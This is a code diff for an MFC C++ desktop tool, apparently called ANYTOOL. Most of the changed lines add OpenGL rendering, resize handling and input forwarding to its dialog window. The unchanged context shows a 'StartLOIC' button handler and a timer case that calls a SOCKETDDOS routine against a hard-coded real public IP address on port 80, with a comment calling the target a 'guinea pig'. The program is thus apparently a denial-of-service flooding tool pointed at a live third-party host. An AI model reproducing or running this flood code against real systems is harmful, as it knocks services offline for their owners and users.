@@ -76,6 +76,7 @@ BEGIN_MESSAGE_MAP(CANYTOOLDlg, CDialogEx)
 	ON_WM_TIMER()
 	ON_WM_LBUTTONDOWN()
 	ON_WM_RBUTTONDOWN()
+	ON_WM_MOUSEMOVE()
 	ON_BN_CLICKED(IDC_MFCBUTTON1, &CANYTOOLDlg::OnBnClicked_Exit)
 	ON_BN_CLICKED(IDC_MFCBUTTON2, &CANYTOOLDlg::OnBnClicked_Begined)
 	ON_BN_CLICKED(IDC_MFCBUTTON3, &CANYTOOLDlg::OnBnClicked_Ended)
@@ -158,8 +159,6 @@ void CANYTOOLDlg::OnPaint()
 	GetClientRect(&rect);
 	MAIN_CDC.FillSolidRect(rect, RGB(37,8,88));
 	
-	
-
 
 
 	//CBitmap Bitmap;
@@ -169,15 +168,27 @@ void CANYTOOLDlg::OnPaint()
 	//MAIN_CDC.SelectObject(brush);
 	//MAIN_CDC.Rectangle(0, 0, rect.Width(), rect.Height());
 
-
-
-	ANYTOOLWINDOWS::OnDraw(&MAIN_CDC);
+	//OpenGL To MFC EX
+	//========================================================================
+	CPaintDC dc(this);
+	MAIN_M_IOGL->OpenGL_TO_MFC__Update_ATENGINE(SCENE);
+	SwapBuffers(dc.GetSafeHdc());
 }
-void CANYTOOLDlg::OnDraw(CDC *pCDC)
+void CANYTOOLDlg::OnDestroy()
 {
-	std::cout << "开始 OnDraw()" << std::endl;
+	CDialogEx::OnDestroy();
 
-	int var = 0;
+	// TODO: 在此处添加消息处理程序代码
+	MAIN_M_IOGL->OpenGL_TO_MFC__End_ATENGINE(SCENE);
+	if (wglGetCurrentContext() != NULL)
+	{
+		wglMakeCurrent(NULL, NULL);
+	}
+	if (NULL != MAIN_M_IOGL->GetGLContext())
+	{
+		wglDeleteContext(MAIN_M_IOGL->GetGLContext());
+		MAIN_M_IOGL->SetGLContext(NULL);
+	}
 }
 
 //当用户拖动最小化窗口时系统调用此函数取得光标
@@ -187,13 +198,61 @@ HCURSOR CANYTOOLDlg::OnQueryDragIcon()
 	return static_cast<HCURSOR>(m_hIcon);
 }
 
+void CANYTOOLDlg::ControlAdaptive(int X, int Y)
+{
+	HWND hwndChild = ::GetWindow(m_hWnd, GW_CHILD);
+	while (hwndChild)
+	{
+		UINT ID = ::GetDlgCtrlID(hwndChild);
+		if (ID == IDC_MFCBUTTON1)
+		{
+			//CRect rec;
+			//GetDlgItem(ID)->GetWindowRect(&rec);
+			//int W = rec.Width();
+			//int H = rec.Height();
+
+
+			//int Left = X - W;
+			//int Top = Y - H;
+			//int RIght = X - W + W;
+			//int Buttom = Y - (Y - H);
+
+
+			//GetDlgItem(ID)->MoveWindow(CRect(Left, Top, RIght, Buttom), TRUE);
+		}
+
+
+
+		hwndChild = ::GetWindow(hwndChild, GW_HWNDNEXT);
+	}
+
+}
+
 void CANYTOOLDlg::OnSize(UINT nType, int cx, int cy)
 {
 	CDialogEx::OnSize(nType,cx,cy);
 	if (nType != SIZE_MINIMIZED)
 	{
 		printf("窗口大小改变! nType = %d cx = %d cy = %d\n",nType,cx,cy);
+		GetClientRect(&m_Rect);
+
+
+		CANYTOOLDlg::ControlAdaptive(cx, cy);
+
+
+		//OpenGL To MFC EX
+		//========================================================================
+		MAIN_M_IOGL->OpenGL_TO_MFC__Init_ATENGINE(SCENE, cx, cy);
+		//选择在GL_BACK缓存绘制图形，因为在SetWindowPixelFormat函数中设定了使用双缓存（PFD_DOUBLEBUFFER）
+		glDrawBuffer(GL_BACK);
+		//发出WM_PAINT消息，引起重新绘制，参数FALSE表示不需要Windows刷新背景，因为利用了OpenGL的glClear函数来刷新背景
+		Invalidate(FALSE);
 	}
+}
+
+void CANYTOOLDlg::OnMouseMove(UINT nType, CPoint Pos)
+{
+	SCENE->OnMouseMoveEvent(Pos.x, Pos.y);
 }
 
 //初始化代码放这
@@ -225,6 +284,25 @@ void CANYTOOLDlg::Init_DATA()
 	m_EditMusicProgress.SetTicFreq(10);
 	m_EditMusicVolume.SetRange(0, 100);
 	m_EditMusicVolume.SetTicFreq(10);
+
+	GetClientRect(&m_Rect);//Left 左上角的X top 为左上角的Y 后面的连个同理,是右下角的
+
+
+	//OpenGL To MFC EX
+	//========================================================================
+	MAIN_M_IOGL->InitHDCTOMFC(this);
+	MAIN_M_IOGL->OpenGL_TO_MFC__Init_ATENGINE(SCENE, m_Rect.Width(), m_Rect.Height());
+	ATENGINE__ATUPDATEDATA__DRAW_BEGIN;
+
+
+
+	//下边两个函数获取的是显示屏幕的大小，但不包括任务栏等区域
+	//int cx = GetSystemMetrics(SM_CXFULLSCREEN);
+	//int cy = GetSystemMetrics(SM_CYFULLSCREEN);
+	////下边这两个函数获取的是真正屏幕的大小：屏幕分辨率
+	//int nWidth = GetSystemMetrics(SM_CXSCREEN);  //屏幕宽度    
+	//int nHeight = GetSystemMetrics(SM_CYSCREEN); //屏幕高度
+
 }
 //===============================================
 void CANYTOOLDlg::OnBnClicked_StartLOIC()
@@ -309,7 +387,8 @@ void CANYTOOLDlg::OnRButtonDown(UINT nFlags, CPoint point)
 
 BOOL CANYTOOLDlg::PreTranslateMessage(MSG *pMsg)
 {
-	if (pMsg->message == WM_KEYDOWN && pMsg->wParam == 0X0D)
+	SCENE->OnOrdinaryKeyboardDownEvent(pMsg->wParam, 0, 0);
+	if (pMsg->message == WM_KEYDOWN && pMsg->wParam == VK_RETURN)
 	{
 		return TRUE;
 	}
@@ -362,6 +441,14 @@ void CANYTOOLDlg::OnTimer(UINT_PTR nIDEvent)
 		std::cout << "小白鼠,点击鼠标右键停止它的工作 ！" << std::endl;
 		//小白鼠
 		MAIN_M_FUNCTION->SOCKETDDOS(CString("180.97.33.107"),80);
+	}; break;
+	//OpenGL To MFC EX
+	//========================================================================
+	case ATENGINE__ATUPDATEDATA__DRAW:
+	{
+		CPaintDC dc(this);
+		MAIN_M_IOGL->OpenGL_TO_MFC__Update_ATENGINE(SCENE);
+		SwapBuffers(dc.GetSafeHdc());
 	}; break;
 	}
 }
